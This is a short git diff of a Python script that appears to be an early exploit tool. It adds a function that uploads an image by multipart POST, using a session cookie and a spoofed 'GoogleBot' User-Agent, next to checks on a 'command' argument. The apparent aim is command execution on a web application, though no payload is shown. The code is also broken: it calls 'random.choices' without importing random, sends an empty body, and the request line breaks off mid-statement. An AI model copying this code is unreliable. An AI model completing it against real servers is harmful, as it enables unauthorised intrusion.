@@ -3,7 +3,8 @@
 from http import client
 import argparse
 from re import search as research
-from random import randint
+from random import randint,choices
+
 
 def banner():
     print("NO banner yet")
@@ -30,13 +31,18 @@ def argument_checker(args):
     argument_checker_command(args.command)
 
 def upload_image(HTTPHandler, host, cookie):
+    boundary = "".join(random.choices("abcdef0123456789",k=20))
+    bodydata = ""
+
     header = {
         "HOST":host,
         "User-Agent":"GoogleBot",
         "Connection":"close",
         "Cookie":cookie,
         "Content-Length":len(bodydata),
-        "Content-TYpe":"multipart/form-data; 
+        "Content-Type":"multipart/form-data; boundary={}".format(boundary)
+        }
+    HTTPHandler.request("POST",
 
 def argument_checker_host(HTTPHandler,host,path):
     """ 
